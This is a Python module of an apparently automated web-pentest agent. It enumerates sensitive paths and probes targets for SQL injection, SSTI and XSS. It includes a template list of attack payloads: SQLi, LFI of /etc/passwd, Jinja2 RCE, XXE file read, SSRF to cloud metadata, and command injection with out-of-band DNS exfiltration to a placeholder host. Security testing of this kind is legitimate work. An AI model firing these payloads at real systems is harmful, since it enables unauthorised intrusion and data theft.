"""
Bounded Context: Web Domain Solver
Enumeración HTTP, inspección de rotas y seguridad Web con explotación automatizada.
"""
import re
import json
from typing import Dict, Any, FrozenSet, List
from .base import BaseDomainSolver
from .registry import register_solver
from .hypothesis import Hypothesis, TournamentResult
from .engine import TacticalHypothesisEngine
from ..security.security_barrier_policy import CommandAllowlistPolicy
from ..dtos.domain_dtos import (
    AnalysisRequest, DomainAnalysisReport, CommandSpec, WebAttackTemplate,
)

ALLOWED_WEB_BINARIES: FrozenSet[str] = frozenset({
    "curl", "nmap", "gobuster", "whatweb", "nikto", "ffuf", "wfuzz",
})


@register_solver("web")
class WebDomainSolver(BaseDomainSolver):
    """Solver especializado em segurança Web com auto-exploitation."""

    def __init__(self, executor=None, file_reader=None, engine: TacticalHypothesisEngine = None):
        super().__init__(executor=executor, file_reader=file_reader)
        self.engine = engine or TacticalHypothesisEngine()
        self.security_policy = CommandAllowlistPolicy(ALLOWED_WEB_BINARIES)

    @property
    def domain_type(self) -> str:
        return "web"

    # ── Exploitation Techniques ───────────────────────────────────────

    def get_templates(self) -> Dict[str, WebAttackTemplate]:
        """Return web attack templates for the agent to use."""
        return {
            "sqli_union": WebAttackTemplate(
                name="SQL Injection — UNION",
                payload="' OR 1=1--",
                technique="sqli",
            ),
            "sqli_blind_time": WebAttackTemplate(
                name="SQL Injection — Time-Based Blind",
                payload="' AND SLEEP(5)--",
                technique="sqli_blind",
            ),
            "sqli_error": WebAttackTemplate(
                name="SQL Injection — Error-Based",
                payload="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                technique="sqli_error",
            ),
            "lfi": WebAttackTemplate(
                name="Local File Inclusion",
                payload="../../../../etc/passwd",
                technique="lfi",
            ),
            "lfi_php_filter": WebAttackTemplate(
                name="LFI via PHP Filter",
                payload="php://filter/convert.base64-encode/resource=index.php",
                technique="lfi",
            ),
            "ssti_jinja2": WebAttackTemplate(
                name="SSTI — Jinja2 Detection",
                payload="{{7*7}}",
                technique="ssti",
            ),
            "ssti_rce": WebAttackTemplate(
                name="SSTI — Jinja2 RCE via lipsum",
                payload="{{lipsum.__globals__['os'].popen('id').read()}}",
                technique="ssti_rce",
            ),
            "xss_reflected": WebAttackTemplate(
                name="XSS — Reflected Detection",
                payload="<script>alert(1)</script>",
                technique="xss",
            ),
            "xss_img": WebAttackTemplate(
                name="XSS — img onerror",
                payload="<img src=x onerror=alert(1)>",
                technique="xss",
            ),
            "xxe_basic": WebAttackTemplate(
                name="XXE — File Read",
                payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                technique="xxe",
            ),
            "ssrf_aws": WebAttackTemplate(
                name="SSRF — AWS Metadata",
                payload="http://169.254.169.254/latest/meta-data/",
                technique="ssrf",
            ),
            "cmd_injection": WebAttackTemplate(
                name="Command Injection — Basic",
                payload="; id",
                technique="cmdi",
            ),
            "cmd_injection_blind": WebAttackTemplate(
                name="Command Injection — OOB",
                payload="; nslookup $(whoami).{lhost}",
                technique="cmdi_oob",
            ),
        }

    def enumerate_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Discover endpoints via common paths and directory bruteforce."""
        common_paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD",
            "/admin", "/login", "/api", "/graphql", "/wp-admin",
            "/debug", "/console", "/swagger.json", "/openapi.json",
            "/.well-known/security.txt", "/server-status", "/server-info",
            "/phpinfo.php", "/info.php", "/test.php", "/backup",
            "/config.php", "/wp-config.php.bak", "/database.sql",
            "/.htpasswd", "/.htaccess", "/cgi-bin/", "/trace",
            "/actuator", "/actuator/health", "/metrics",
        ]
        findings = []
        for path in common_paths:
            url = target.rstrip("/") + path
            result = self.executor.execute(CommandSpec(
                binary="curl",
                args=["-s", "-o", "/dev/null", "-w", "%{http_code}", "-m", "5", url],
                timeout=8,
            ))
            if result.success and result.output.strip() not in ("404", "000", ""):
                findings.append({
                    "path": path,
                    "status": int(result.output.strip()) if result.output.strip().isdigit() else result.output.strip(),
                    "url": url,
                })
        return findings

    def detect_sqli(self, target: str, param: str = "id") -> Dict[str, Any]:
        """Automated SQLi detection via time-based and error-based payloads."""
        results = {"injectable": False, "type": None, "evidence": ""}

        # Time-based detection
        payloads = [
            ("time_based", f"{target}?{param}=1' AND SLEEP(3)--", 3),
            ("time_based_pg", f"{target}?{param}=1'; SELECT pg_sleep(3)--", 3),
            ("error_based", f"{target}?{param}=1'", None),
            ("boolean_true", f"{target}?{param}=1 AND 1=1", None),
            ("boolean_false", f"{target}?{param}=1 AND 1=2", None),
        ]

        for attack_type, url, delay in payloads:
            import time as _time
            start = _time.time()
            result = self.executor.execute(CommandSpec(
                binary="curl", args=["-s", "-m", "10", url], timeout=12
            ))
            elapsed = _time.time() - start

            if not result.success:
                continue

            output = result.output.lower()

            # Time-based: did it take ~delay seconds?
            if delay and elapsed >= delay - 0.5:
                results = {"injectable": True, "type": "time_based", "evidence": f"Response took {elapsed:.1f}s (expected ~{delay}s)"}
                break

            # Error-based: SQL error messages
            sql_errors = [
                "sql syntax", "mysql_", "syntax error", "unclosed quotation",
                "odbc", "ora-", "postgresql", "sqlite3", "warning: mysql",
                "valid mysql result", "pg_query", "unterminated quoted string",
            ]
            if any(err in output for err in sql_errors):
                results = {"injectable": True, "type": "error_based", "evidence": f"SQL error detected in response"}
                break

        return results

    def detect_ssti(self, target: str, param: str = "name") -> Dict[str, Any]:
        """Automated SSTI detection across multiple template engines."""
        results = {"vulnerable": False, "engine": None, "evidence": ""}

        test_payloads = [
            ("jinja2", "{{7*7}}", "49"),
            ("twig", "{{7*7}}", "49"),
            ("freemarker", "${7*7}", "49"),
            ("erb", "<%= 7*7 %>", "49"),
            ("velocity", "#set($x=7*7)${x}", "49"),
        ]

        for engine, payload, expected in test_payloads:
            url = f"{target}?{param}={payload}"
            result = self.executor.execute(CommandSpec(
                binary="curl", args=["-s", "-m", "10", url], timeout=12
            ))
            if result.success and expected in result.output:
                results = {"vulnerable": True, "engine": engine, "evidence": f"Payload '{payload}' → '{expected}' found in response"}
                break

        return results

    def detect_xss(self, target: str, param: str = "q") -> Dict[str, Any]:
        """Automated XSS reflection detection."""
        results = {"reflective": False, "context": None, "evidence": ""}

        test_payloads = [
            "ozz12345",  # Unique marker for reflection
            "<script>ozz12345</script>",
            "'\"ozz12345",
        ]

        for payload in test_payloads:
            url = f"{target}?{param}={payload}"
            result = self.executor.execute(CommandSpec(
                binary="curl", args=["-s", "-m", "10", url], timeout=12
            ))
            if result.success and "ozz12345" in result.output:
                # Check if it's reflected unfiltered
                if "<script>" in result.output and payload == test_payloads[1]:
                    results = {"reflective": True, "context": "html_unfiltered", "evidence": "Script tag reflected without encoding"}
                elif "'\"" in result.output and payload == test_payloads[2]:
                    results = {"reflective": True, "context": "attribute_breakable", "evidence": "Quotes reflected — may break attributes"}
                else:
                    results = {"reflective": True, "context": "encoded_or_filtered", "evidence": "Input reflected but may be encoded/filtered"}
                break

        return results

    # ── Tournament & Analysis ─────────────────────────────────────────

    def solve_tactical_step(self, metadata: Dict[str, Any]) -> TournamentResult[CommandSpec]:
        """Gera, sanitiza e ranqueia hipóteses táticas de enumeração Web via Torneio Elo."""
        target = str(metadata.get("target_resource", "http://localhost"))
        target_type = str(metadata.get("target_type", "http")).lower()

        hyp_headers_score = 0.95 if target_type == "http" or "http" in target else 0.5
        hyp_robots_score = 0.85 if "http" in target else 0.4
        hyp_options_score = 0.7 if "http" in target else 0.3
        hyp_nmap_score = 0.9 if target_type == "port_scan" or "http" not in target else 0.3
        hyp_gobuster_score = 0.8 if "http" in target else 0.2
        hyp_whatweb_score = 0.88 if "http" in target else 0.3

        robots_url = f"{target.rstrip('/')}/robots.txt"

        hypotheses = [
            Hypothesis(
                id="hyp_headers",
                name="Inspeção de Cabeçalhos HTTP Response",
                payload=CommandSpec(binary="curl", args=["-sI", "-m", "10", target]),
                initial_score=hyp_headers_score,
            ),
            Hypothesis(
                id="hyp_robots",
                name="Consulta ao robots.txt",
                payload=CommandSpec(binary="curl", args=["-s", robots_url]),
                initial_score=hyp_robots_score,
            ),
            Hypothesis(
                id="hyp_options",
                name="Verificação de Métodos HTTP Permitidos",
                payload=CommandSpec(binary="curl", args=["-X", "OPTIONS", "-sI", target]),
                initial_score=hyp_options_score,
            ),
            Hypothesis(
                id="hyp_nmap_web",
                name="Detecção de Serviços Web via Nmap",
                payload=CommandSpec(binary="nmap", args=["-sV", "-p", "80,443,8080,8443", target]),
                initial_score=hyp_nmap_score,
            ),
            Hypothesis(
                id="hyp_gobuster",
                name="Directory Bruteforce via Gobuster",
                payload=CommandSpec(binary="gobuster", args=["dir", "-u", target, "-w", "/usr/share/wordlists/dirb/common.txt", "-t", "20", "-q"]),
                initial_score=hyp_gobuster_score,
            ),
            Hypothesis(
                id="hyp_whatweb",
                name="Fingerprint de Tecnologias Web",
                payload=CommandSpec(binary="whatweb", args=["-q", target]),
                initial_score=hyp_whatweb_score,
            ),
        ]

        return self.engine.run_tournament(
            hypotheses, context=metadata, policy=self.security_policy
        )

    def analyze(self, request: AnalysisRequest) -> DomainAnalysisReport:
        target = request.target_resource

        # Phase 1: Tactical enumeration via tournament
        tournament_res = self.solve_tactical_step({
            "target_resource": target,
            "target_type": request.options.get("target_type", "http"),
        })
        winning_cmd = tournament_res.winner.payload
        exec_res = self.executor.execute(winning_cmd)

        observations = [exec_res.output] if exec_res.success else []
        errors = [exec_res.error] if exec_res.error else []
        metadata: Dict[str, Any] = {
            "target": target,
            "winning_hypothesis": tournament_res.winner.name,
            "debate_summary": tournament_res.debate_summary,
        }

        # Phase 2: Auto-exploitation (if web target)
        if "http" in target:
            try:
                # Endpoint discovery
                endpoints = self.enumerate_endpoints(target)
                if endpoints:
                    metadata["endpoints"] = endpoints
                    observations.append(f"Discovered {len(endpoints)} endpoints")

                # SQLi detection
                sqli_result = self.detect_sqli(target)
                metadata["sqli"] = sqli_result
                if sqli_result.get("injectable"):
                    observations.append(f"SQLi DETECTED: {sqli_result['type']} — {sqli_result['evidence']}")

                # SSTI detection
                ssti_result = self.detect_ssti(target)
                metadata["ssti"] = ssti_result
                if ssti_result.get("vulnerable"):
                    observations.append(f"SSTI DETECTED: {ssti_result['engine']} — {ssti_result['evidence']}")

                # XSS detection
                xss_result = self.detect_xss(target)
                metadata["xss"] = xss_result
                if xss_result.get("reflective"):
                    observations.append(f"XSS REFLECTION: {xss_result['context']} — {xss_result['evidence']}")

            except Exception as e:
                errors.append(f"Auto-exploit phase error: {e}")

        return DomainAnalysisReport(
            domain=self.domain_type,
            success=exec_res.success,
            observations=observations,
            errors=errors,
            metadata=metadata,
        )
